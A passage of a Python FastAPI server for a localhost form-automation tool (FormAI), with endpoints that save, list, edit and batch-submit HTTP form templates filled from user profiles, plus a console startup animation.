        return {"success": False, "error": str(e)}

@app.get("/api/http-submit/stats")
async def get_rate_limit_stats(url: str = None):
    """Get rate limiting statistics"""
    try:
        submitter = get_http_submitter()
        stats = submitter.get_rate_limit_stats(url)
        return {"success": True, "data": stats}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/reset-rate-limit")
async def reset_rate_limit(request: dict):
    """Reset rate limiter for URL or all domains"""
    try:
        url = request.get("url")
        submitter = get_http_submitter()
        submitter.reset_rate_limiter(url)
        return {"success": True, "message": "Rate limiter reset"}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.get("/http-submit")
async def http_submit_page():
    """HTTP submission UI page"""
    return FileResponse(str(BASE_PATH / "web" / "http_submit.html"))

# ============================================================================
# Saved Request Templates API
# ============================================================================

saved_request_manager = None

def get_saved_request_manager():
    """Get or create saved request manager"""
    global saved_request_manager
    if saved_request_manager is None:
        from tools.saved_request_manager import SavedRequestManager
        saved_request_manager = SavedRequestManager()
    return saved_request_manager

@app.post("/api/saved-requests/save")
async def save_request_template(request: dict):
    """Save a new request template"""
    try:
        manager = get_saved_request_manager()

        # Extract data from request
        name = request.get("name", "Untitled Template")
        url = request.get("url")
        method = request.get("method", "POST")
        headers = request.get("headers", {})
        form_data = request.get("form_data", {})
        field_mappings = request.get("field_mappings", {})
        detect_csrf = request.get("detect_csrf", True)
        description = request.get("description", "")
        tags = request.get("tags", [])

        if not url:
            return JSONResponse(
                status_code=400,
                content={"success": False, "error": "URL is required"}
            )

        # Create template
        template = manager.create_from_parsed_request(
            name=name,
            url=url,
            method=method,
            headers=headers,
            form_data=form_data,
            field_mappings=field_mappings,
            detect_csrf=detect_csrf,
            description=description,
            tags=tags
        )

        return {
            "success": True,
            "template": template.to_dict(),
            "message": f"Template '{name}' saved successfully"
        }

    except Exception as e:
        logger.error(f"Failed to save template: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.get("/api/saved-requests")
async def list_saved_requests(search: Optional[str] = None):
    """List all saved request templates"""
    try:
        manager = get_saved_request_manager()

        if search:
            templates = manager.search(search)
        else:
            templates = manager.list_all()

        return {
            "success": True,
            "templates": [t.to_dict() for t in templates],
            "count": len(templates)
        }

    except Exception as e:
        logger.error(f"Failed to list templates: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.get("/api/saved-requests/{template_id}")
async def get_saved_request(template_id: str):
    """Get specific template by ID"""
    try:
        manager = get_saved_request_manager()
        template = manager.get(template_id)

        if not template:
            return JSONResponse(
                status_code=404,
                content={"success": False, "error": "Template not found"}
            )

        return {
            "success": True,
            "template": template.to_dict()
        }

    except Exception as e:
        logger.error(f"Failed to get template {template_id}: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.put("/api/saved-requests/{template_id}")
async def update_saved_request(template_id: str, request: dict):
    """Update existing template"""
    try:
        manager = get_saved_request_manager()

        # Get allowed update fields
        updates = {}
        allowed_fields = ["name", "url", "method", "headers", "form_data_template",
                         "field_mappings", "detect_csrf", "description", "tags"]

        for field in allowed_fields:
            if field in request:
                updates[field] = request[field]

        template = manager.update(template_id, updates)

        if not template:
            return JSONResponse(
                status_code=404,
                content={"success": False, "error": "Template not found"}
            )

        return {
            "success": True,
            "template": template.to_dict(),
            "message": "Template updated successfully"
        }

    except Exception as e:
        logger.error(f"Failed to update template {template_id}: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.delete("/api/saved-requests/{template_id}")
async def delete_saved_request(template_id: str):
    """Delete template by ID"""
    try:
        manager = get_saved_request_manager()
        deleted = manager.delete(template_id)

        if not deleted:
            return JSONResponse(
                status_code=404,
                content={"success": False, "error": "Template not found"}
            )

        return {
            "success": True,
            "message": "Template deleted successfully"
        }

    except Exception as e:
        logger.error(f"Failed to delete template {template_id}: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/saved-requests/execute-batch")
async def execute_batch_templates(request: dict):
    """Execute multiple templates with one profile"""
    try:
        manager = get_saved_request_manager()
        submitter = get_http_submitter()

        # Get parameters
        template_ids = request.get("template_ids", [])
        profile_id = request.get("profile_id")

        if not template_ids:
            return JSONResponse(
                status_code=400,
                content={"success": False, "error": "No templates selected"}
            )

        if not profile_id:
            return JSONResponse(
                status_code=400,
                content={"success": False, "error": "No profile selected"}
            )

        # Load profile
        profile_path = Path("profiles") / f"{profile_id}.json"
        if not profile_path.exists():
            return JSONResponse(
                status_code=404,
                content={"success": False, "error": f"Profile '{profile_id}' not found"}
            )

        with open(profile_path, 'r', encoding='utf-8') as f:
            profile = json.load(f)

        # Execute each template
        results = []

        for template_id in template_ids:
            template = manager.get(template_id)

            if not template:
                results.append({
                    "template_id": template_id,
                    "template_name": "Unknown",
                    "success": False,
                    "error": "Template not found"
                })
                continue

            try:
                # Merge profile data with template
                form_data = template.merge_with_profile(profile)

                # Submit request
                result = submitter.submit_form(
                    url=template.url,
                    form_data=form_data,
                    method=template.method,
                    headers=template.headers,
                    detect_csrf=template.detect_csrf
                )

                results.append({
                    "template_id": template_id,
                    "template_name": template.name,
                    "url": template.url,
                    "success": result.success,
                    "status_code": result.status_code,
                    "attempts": result.attempts,
                    "timing": result.timing,
                    "error": result.error_message if not result.success else None
                })

            except Exception as e:
                logger.error(f"Failed to execute template {template_id}: {e}", exc_info=True)
                results.append({
                    "template_id": template_id,
                    "template_name": template.name,
                    "success": False,
                    "error": str(e)
                })

        # Calculate summary
        successful = sum(1 for r in results if r["success"])
        failed = len(results) - successful

        return {
            "success": True,
            "summary": {
                "total": len(results),
                "successful": successful,
                "failed": failed
            },
            "results": results
        }

    except Exception as e:
        logger.error(f"Failed to execute batch: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.get("/api/saved-requests/stats")
async def get_saved_requests_stats():
    """Get statistics about saved templates"""
    try:
        manager = get_saved_request_manager()
        stats = manager.get_stats()

        return {
            "success": True,
            "stats": stats
        }

    except Exception as e:
        logger.error(f"Failed to get stats: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

# Static file serving (works in both dev and PyInstaller bundle)
app.mount("/static", StaticFiles(directory=str(BASE_PATH / "static")), name="static")
app.mount("/web", StaticFiles(directory=str(BASE_PATH / "web")), name="web")

def show_startup_animation():
    """Display cool startup animation with Gemini-style typewriter effect"""
    import time
    from colorama import Fore, Style, init
    init()

    def typewriter(text, delay=0.02, color="", end="\n"):
        """Print text with typewriter effect like Gemini CLI"""
        for char in text:
            print(f"{color}{char}{Style.RESET_ALL}", end='', flush=True)
            time.sleep(delay)
        print(end=end)

    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Large KPR ASCII art banner
    kpr_banner = """
██╗  ██╗██████╗ ██████╗
██║ ██╔╝██╔══██╗██╔══██╗
█████╔╝ ██████╔╝██████╔╝
██╔═██╗ ██╔═══╝ ██╔══██╗
██║  ██╗██║     ██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
"""

    for line in kpr_banner.strip().split('\n'):
        typewriter(line, 0.005, Fore.CYAN)

    print()
    typewriter("Browser Automation Platform", 0.015, Fore.CYAN)
    print()

    # Loading steps with typewriter effect and faster delays
    steps = [
        ("Initializing browser engine", 0.1),
        ("Loading automation modules", 0.08),
        ("Preparing AI field mapper", 0.08),
        ("Starting web server", 0.12),
        ("Configuring network", 0.08),
        ("Establishing secure connections", 0.08),
        ("Ready to launch", 0.1)
    ]

    for step, delay in steps:
        typewriter(f"▶ {step}...", 0.015, Fore.GREEN, end='')
        time.sleep(delay)
        print(f" {Fore.GREEN}✓{Style.RESET_ALL}")

    print()
    typewriter("━" * 54, 0.005, Fore.CYAN)
    typewriter("✓ Server running on http://localhost:5511", 0.02, Fore.GREEN)
    typewriter("⚠ Close this window to stop FormAI", 0.02, Fore.YELLOW)
    typewriter("━" * 54, 0.005, Fore.CYAN)
    print()

if __name__ == "__main__":
    import webbrowser
    import threading
    import time

    # Skip startup animation when launched from test.bat
    # show_startup_animation()

    print("\nServer starting on http://localhost:5511")
    print("Close this window to stop FormAI\n")

    def open_browser():
        """Open browser after a short delay"""
        time.sleep(1)  # Short delay for server to start
        try:
            webbrowser.open("http://localhost:5511")
        except:
            pass  # Silently fail if browser can't open

    # Start browser in background thread
    threading.Thread(target=open_browser, daemon=True).start()

    # Run the server (when terminal closes, this exits and server stops)
    uvicorn.run(
        app,
        host="127.0.0.1",
        port=5511,
        log_level="error",  # Only show errors, suppress info/warning logs
        access_log=False
    )